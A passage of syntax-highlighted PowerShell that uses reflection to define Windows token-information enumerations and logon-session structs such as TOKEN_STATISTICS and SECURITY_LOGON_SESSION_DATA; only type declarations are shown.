punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenUser'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 1<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenGroups'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 2<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenPrivileges'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 3<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenOwner'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 4<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenPrimaryGroup'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 5<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenDefaultDacl'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 6<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenSource'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 7<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenType'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 8<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenImpersonationLevel'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 9<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenStatistics'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 10<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenRestrictedSids'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 11<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenSessionId'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 12<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenGroupsAndPrivileges'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 13<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenSessionReference'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 14<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenSandBoxInert'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 15<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenAuditPolicy'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 16<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenOrigin'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 17<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenElevationType'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 18<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenLinkedToken'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 19<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenElevation'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 20<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenHasRestrictions'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 21<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenAccessInformation'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 22<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenVirtualizationAllowed'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 23<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenVirtualizationEnabled'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 24<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenIntegrityLevel'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 25<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenUIAccess'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 26<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenMandatoryPolicy'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 27<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenLogonSid'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 28<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenIsAppContainer'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 29<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenCapabilities'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 30<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenAppContainerSid'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 31<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenAppContainerNumber'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 32<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenUserClaimAttributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 33<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenDeviceClaimAttributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 34<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenRestrictedUserClaimAttributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 35<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenRestrictedDeviceClaimAttributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 36<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenDeviceGroups'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 37<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenRestrictedDeviceGroups'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 38<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenSecurityAttributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 39<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenIsRestricted'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 40<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'MaxTokenInfoClass'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 41<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TOKEN_INFORMATION_CLASS</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#STRUCTs</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'LARGE_INTEGER'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">,</span> 8<span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LowPart'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'HighPart'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$LARGE_INTEGER</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct LUID</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'LUID'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">,</span> 8<span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LowPart'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'HighPart'</span><span class="token punctuation">,</span> <span class="token namespace">[Int32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$LUID</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct TOKEN_STATISTICS</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'TOKEN_STATISTICS'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'TokenId'</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AuthenticationId'</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'ExpirationTime'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'TokenType'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'ImpersonationLevel'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'DynamicCharged'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'DynamicAvailable'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'GroupCount'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'PrivilegeCount'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'ModifiedId'</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TOKEN_STATISTICS</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct LSA_UNICODE_STRING</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'LSA_UNICODE_STRING'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Length'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'MaximumLength'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Buffer'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$LSA_UNICODE_STRING</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct LSA_LAST_INTER_LOGON_INFO</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'LSA_LAST_INTER_LOGON_INFO'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LastSuccessfulLogon'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LastFailedLogon'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'FailedAttemptCountSinceLastSuccessfulLogon'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$LSA_LAST_INTER_LOGON_INFO</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct SECURITY_LOGON_SESSION_DATA</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'SECURITY_LOGON_SESSION_DATA'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Size'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LoginID'</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Username'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LoginDomain'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AuthenticationPackage'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LogonType'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Session'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Sid'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LoginTime'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LoginServer'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'DnsDomainName'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Upn'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'UserFlags'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LastLogonInfo'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_LAST_INTER_LOGON_INFO</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LogonScript'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'ProfilePath'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'HomeDirectory'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'HomeDirectoryDrive'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token 